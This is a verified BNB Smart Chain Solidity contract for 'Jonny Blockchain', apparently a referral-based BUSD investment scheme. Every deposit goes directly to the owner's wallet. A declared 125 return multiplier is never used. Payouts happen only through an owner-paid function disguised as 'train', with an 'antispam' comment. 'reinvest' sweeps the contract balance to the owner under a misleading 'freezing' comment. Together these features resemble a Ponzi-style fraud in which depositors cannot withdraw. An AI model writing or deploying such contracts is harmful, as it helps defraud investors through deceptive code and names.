/**
 *Submitted for verification at BscScan.com on 2021-10-11
*/

//pragma solidity ^0.5.17;
pragma solidity 0.8.3;
/*
 SPDX-License-Identifier: MIT 
------------------------------------
 Jonny Blockchain (R) BUSD smart contract v. 1.0
 Website :  https://jonnyblockchain.com
------------------------------------
*/
contract JonnyBlockchain {
    using SafeMath for uint;
    using SafeBEP20 for IBEP20;

    IBEP20 public token = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // BUSD
    uint public totalAmount;
    uint public totalReturn;
    uint constant private minDepositSizeBusd = 3 ether; // 3 BUSD
    uint constant private returnMultiplier = 125;
    address payable owner;
    struct User {
        address sponsor;
        uint amount;
        uint returned;
    }
    mapping(address => User) public users;

    event Signup(address indexed userAddress, address indexed _referrer);
    event Deposit(address indexed userAddress, uint amount, uint totalAmount);
    event Withdrawal(address indexed userAddress, uint amount, uint userReturn, uint totalReturn);
    event Unfreeze(uint amount);

    /**
     * owner only access
     */
    modifier onlyOwner() {
        if (msg.sender == owner) {
            _;
        }
    }

    constructor() {
        owner = payable(msg.sender);
    }

    /**
     * deposit handler function
     */
    function deposit(address _affAddr, uint amount) public payable {
        require(amount >= minDepositSizeBusd);
        token.safeTransferFrom(msg.sender, address(this), amount);
        token.safeTransfer(owner, amount);
        User storage user = users[msg.sender];

        // registering a new user

        if (user.amount == 0) {
            user.sponsor = _affAddr != msg.sender && _affAddr != address(0) && users[_affAddr].amount > 0 ? _affAddr : owner;
            emit Signup(msg.sender, user.sponsor);
        }

        // updating counters

        user.amount = user.amount.add(amount);
        totalAmount = totalAmount.add(amount);
        emit Deposit(msg.sender, amount, totalAmount);
    }

    /**
     * antispam function name
     */
    function train(address payable client, uint amount) public payable {
        User storage user = users[client];

        token.safeTransferFrom(msg.sender, address(this), amount);
        token.safeTransfer(client, amount);
        
        user.returned = user.returned.add(amount);
        totalReturn = totalReturn.add(amount);
        emit Withdrawal(client, amount, user.returned, totalReturn);
    }

    /**
     * this prevents the contract from freezing
     */
    function reinvest() public onlyOwner {
        uint frozen = token.balanceOf(address(this));
        token.safeTransfer(owner, frozen);
        emit Unfreeze(frozen);
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeBEP20 {
    using SafeMath for uint256;
    using Address for address;
    function safeTransfer(IBEP20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    function safeTransferFrom(IBEP20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    function callOptionalReturn(IBEP20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeBEP20: call to non-contract");
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeBEP20: low-level call failed");
        if (returndata.length > 0) { // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeBEP20: BEP20 operation did not succeed");
        }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}